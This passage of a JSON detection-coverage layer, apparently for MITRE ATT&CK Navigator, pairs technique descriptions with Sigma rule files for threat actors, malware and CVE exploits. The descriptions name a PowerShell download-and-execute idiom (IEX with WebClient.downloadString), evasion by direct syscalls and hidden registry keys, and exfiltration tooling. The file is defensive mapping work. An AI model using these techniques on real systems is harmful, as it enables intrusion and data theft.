            "comment": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_oilrig_mar18.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\OilRig\\proc_creation_win_apt_oilrig_mar18.yml"
                },
                {
                    "name": "win_security_apt_oilrig_mar18.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\OilRig\\win_security_apt_oilrig_mar18.yml"
                },
                {
                    "name": "win_system_apt_oilrig_mar18.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\OilRig\\win_system_apt_oilrig_mar18.yml"
                },
                {
                    "name": "proc_creation_win_malware_blue_mockingbird.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Malware\\Blue-Mockingbird\\proc_creation_win_malware_blue_mockingbird.yml"
                },
                {
                    "name": "win_security_remote_registry_management_via_reg.yml",
                    "value": "sigma\\rules-placeholder\\windows\\builtin\\security\\win_security_remote_registry_management_via_reg.yml"
                },
                {
                    "name": "registry_set_office_trusted_location.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\registry\\registry_set\\registry_set_office_trusted_location.yml"
                }
            ]
        },
        {
            "techniqueID": "T1106",
            "score": 3,
            "comment": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.(Citation: Redops Syscalls) Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001).",
            "metadata": [
                {
                    "name": "pipe_created_apt_turla_named_pipes.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\TA\\Turla\\pipe_created_apt_turla_named_pipes.yml"
                },
                {
                    "name": "posh_ps_win_api_functions_access.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\powershell\\powershell_script\\posh_ps_win_api_functions_access.yml"
                },
                {
                    "name": "posh_ps_win_api_library_access.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\powershell\\powershell_script\\posh_ps_win_api_library_access.yml"
                }
            ]
        },
        {
            "techniqueID": "T1105",
            "score": 6,
            "comment": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts.\n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_greenbug_may20.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\TA\\Greenbug\\proc_creation_win_apt_greenbug_may20.yml"
                },
                {
                    "name": "file_event_win_malware_darkgate_autoit3_binary_creation.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\DarkGate\\file_event_win_malware_darkgate_autoit3_binary_creation.yml"
                },
                {
                    "name": "proc_creation_win_malware_pikabot_combined_commands_execution.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\Pikabot\\proc_creation_win_malware_pikabot_combined_commands_execution.yml"
                },
                {
                    "name": "proc_creation_win_curl_download.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_curl_download.yml"
                },
                {
                    "name": "proc_creation_win_curl_execution.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_curl_execution.yml"
                },
                {
                    "name": "proc_creation_win_curl_fileupload.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_curl_fileupload.yml"
                }
            ]
        },
        {
            "techniqueID": "T1098",
            "score": 1,
            "comment": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
            "metadata": [
                {
                    "name": "win_security_samaccountname_spoofing_cve_2021_42287.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-42287\\win_security_samaccountname_spoofing_cve_2021_42287.yml"
                }
            ]
        },
        {
            "techniqueID": "T1087",
            "score": 1,
            "comment": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](https://attack.mitre.org/techniques/T1078)).\n\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\n\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default [PowerShell](https://attack.mitre.org/techniques/T1059/001) and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_pikabot_discovery.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\Pikabot\\proc_creation_win_malware_pikabot_discovery.yml"
                }
            ]
        },
        {
            "techniqueID": "T1083",
            "score": 2,
            "comment": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_turla_commands_critical.yml",
                    "value": "sigma\\rules-emerging-threats\\2014\\TA\\Turla\\proc_creation_win_apt_turla_commands_critical.yml"
                },
                {
                    "name": "proc_creation_win_malware_wannacry.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Malware\\WannaCry\\proc_creation_win_malware_wannacry.yml"
                }
            ]
        },
        {
            "techniqueID": "T1082",
            "score": 1,
            "comment": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)",
            "metadata": [
                {
                    "name": "proc_creation_win_wmic_recon_system_info.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_wmic_recon_system_info.yml"
                }
            ]
        },
        {
            "techniqueID": "T1078",
            "score": 6,
            "comment": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
            "metadata": [
                {
                    "name": "azure_ad_account_created_deleted_nonapproved_user.yml",
                    "value": "sigma\\rules-placeholder\\cloud\\azure\\azure_ad_account_created_deleted_nonapproved_user.yml"
                },
                {
                    "name": "azure_ad_account_signin_outside_hours.yml",
                    "value": "sigma\\rules-placeholder\\cloud\\azure\\azure_ad_account_signin_outside_hours.yml"
                },
                {
                    "name": "azure_privileged_account_no_saw_paw.yml",
                    "value": "sigma\\rules-placeholder\\cloud\\azure\\azure_privileged_account_no_saw_paw.yml"
                },
                {
                    "name": "azure_privileged_account_sigin_expected_controls.yml",
                    "value": "sigma\\rules-placeholder\\cloud\\azure\\azure_privileged_account_sigin_expected_controls.yml"
                },
                {
                    "name": "azure_privileged_account_signin_outside_hours.yml",
                    "value": "sigma\\rules-placeholder\\cloud\\azure\\azure_privileged_account_signin_outside_hours.yml"
                },
                {
                    "name": "win_security_susp_interactive_logons.yml",
                    "value": "sigma\\rules-placeholder\\windows\\builtin\\security\\win_security_susp_interactive_logons.yml"
                }
            ]
        },
        {
            "techniqueID": "T1071",
            "score": 2,
            "comment": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_gallium_iocs.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\TA\\GALLIUM\\proc_creation_win_apt_gallium_iocs.yml"
                },
                {
                    "name": "win_dns_analytic_apt_gallium.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\TA\\GALLIUM\\win_dns_analytic_apt_gallium.yml"
                }
            ]
        },
        {
            "techniqueID": "T1068",
            "score": 7,
            "comment": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
            "metadata": [
                {
                    "name": "proc_creation_win_exploit_cve_2019_1378.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Exploits\\CVE-2019-1378\\proc_creation_win_exploit_cve_2019_1378.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2019_1388.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Exploits\\CVE-2019-1388\\proc_creation_win_exploit_cve_2019_1388.yml"
                },
                {
                    "name": "file_event_win_cve_2021_41379_msi_lpe.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-41379\\file_event_win_cve_2021_41379_msi_lpe.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2021_41379.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-41379\\proc_creation_win_exploit_cve_2021_41379.yml"
                },
                {
                    "name": "proc_creation_win_exploit_other_systemnightmare.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\SystemNightmare-Exploit\\proc_creation_win_exploit_other_systemnightmare.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2022_41120_sysmon_eop.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Exploits\\CVE-2022-41120\\proc_creation_win_exploit_cve_2022_41120_sysmon_eop.yml"
                },
                {
                    "name": "win_security_exploit_cve_2020_1472.yml",
                    "value": "sigma\\rules-placeholder\\windows\\builtin\\security\\win_security_exploit_cve_2020_1472.yml"
                }
            ]
        },
        {
            "techniqueID": "T1059",
            "score": 10,
            "comment": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_turla_commands_critical.yml",
                    "value": "sigma\\rules-emerging-threats\\2014\\TA\\Turla\\proc_creation_win_apt_turla_commands_critical.yml"
                },
                {
                    "name": "proc_creation_win_apt_lazarus_group_activity.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\TA\\Lazarus\\proc_creation_win_apt_lazarus_group_activity.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2021_26084_atlassian_confluence.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-26084\\proc_creation_win_exploit_cve_2021_26084_atlassian_confluence.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2021_40444.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-40444\\proc_creation_win_exploit_cve_2021_40444.yml"
                },
                {
                    "name": "proc_creation_win_apt_revil_kaseya.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\TA\\Kaseya-Supply-Chain\\proc_creation_win_apt_revil_kaseya.yml"
                },
                {
                    "name": "proc_creation_lnx_exploit_cve_2023_22518_confluence_java_child_proc.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-22518\\proc_creation_lnx_exploit_cve_2023_22518_confluence_java_child_proc.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2023_22518_confluence_tomcat_child_proc.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-22518\\proc_creation_win_exploit_cve_2023_22518_confluence_tomcat_child_proc.yml"
                },
                {
                    "name": "file_event_win_malware_darkgate_autoit3_binary_creation.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\DarkGate\\file_event_win_malware_darkgate_autoit3_binary_creation.yml"
                },
                {
                    "name": "proc_creation_win_malware_darkgate_autoit3_from_susp_parent_and_location.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\DarkGate\\proc_creation_win_malware_darkgate_autoit3_from_susp_parent_and_location.yml"
                },
                {
                    "name": "proc_creation_win_susp_elevated_system_shell.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_susp_elevated_system_shell.yml"
                }
            ]
        },
        {
            "techniqueID": "T1055",
            "score": 4,
            "comment": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
            "metadata": [
                {
                    "name": "proc_access_win_malware_verclsid_shellcode.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Malware\\Hancitor\\proc_access_win_malware_verclsid_shellcode.yml"
                },
                {
                    "name": "proc_creation_win_malware_dridex.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Malware\\Dridex\\proc_creation_win_malware_dridex.yml"
                },
                {
                    "name": "av_printernightmare_cve_2021_34527.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-1675\\av_printernightmare_cve_2021_34527.yml"
                },
                {
                    "name": "image_load_usp_svchost_clfsw32.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\TA\\PRIVATELOG\\image_load_usp_svchost_clfsw32.yml"
                }
            ]
        },
        {
            "techniqueID": "T1053",
            "score": 3,
            "comment": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent)",
            "metadata": [
                {
                    "name": "win_security_apt_slingshot.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\Slingshot\\win_security_apt_slingshot.yml"
                },
                {
                    "name": "proc_creation_win_apt_hafnium.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\TA\\HAFNIUM\\proc_creation_win_apt_hafnium.yml"
                },
                {
                    "name": "proc_creation_win_apt_actinium_persistence.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\TA\\ACTINIUM\\proc_creation_win_apt_actinium_persistence.yml"
                }
            ]
        },
        {
            "techniqueID": "T1049",
            "score": 1,
            "comment": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A)",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_pikabot_discovery.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\Pikabot\\proc_creation_win_malware_pikabot_discovery.yml"
                }
            ]
        },
        {
            "techniqueID": "T1047",
            "score": 4,
            "comment": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) (WinRM).(Citation: MSDN WMI) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: MSDN WMI)(Citation: FireEye WMI 2015)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_blue_mockingbird.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Malware\\Blue-Mockingbird\\proc_creation_win_malware_blue_mockingbird.yml"
                },
                {
                    "name": "proc_creation_win_malware_maze_ransomware.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Malware\\Maze\\proc_creation_win_malware_maze_ransomware.yml"
                },
                {
                    "name": "proc_creation_win_apt_unc2452_ps.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\TA\\SolarWinds-Supply-Chain\\proc_creation_win_apt_unc2452_ps.yml"
                },
                {
                    "name": "image_load_wmi_module_load_by_uncommon_process.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\image_load\\image_load_wmi_module_load_by_uncommon_process.yml"
                }
            ]
        },
        {
            "techniqueID": "T1041",
            "score": 2,
            "comment": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
            "metadata": [
                {
                    "name": "net_firewall_apt_equationgroup_c2.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\TA\\Equation-Group\\net_firewall_apt_equationgroup_c2.yml"
                },
                {
                    "name": "proc_creation_win_susp_exfil_and_tunneling_tool_execution.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_susp_exfil_and_tunneling_tool_execution.yml"
                }
            ]
        },
        {
            "techniqueID": "T1036",
            "score": 2,
            "comment": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site) Masquerading may also include the use of [Proxy](https://attack.mitre.org/techniques/T1090) or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.",
            "metadata": [
                {
                    "name": "win_security_samaccountname_spoofing_cve_2021_42287.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-42287\\win_security_samaccountname_spoofing_cve_2021_42287.yml"
                },
                {
                    "name": "proc_creation_win_mode_codepage_change.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_mode_codepage_change.yml"
                }
            ]
        },
        {
            "techniqueID": "T1033",
            "score": 1,
            "comment": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_dridex.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Malware\\Dridex\\proc_creation_win_malware_dridex.yml"
                }
            ]
        },
        {
            "techniqueID": "T1027",
            "score": 4,
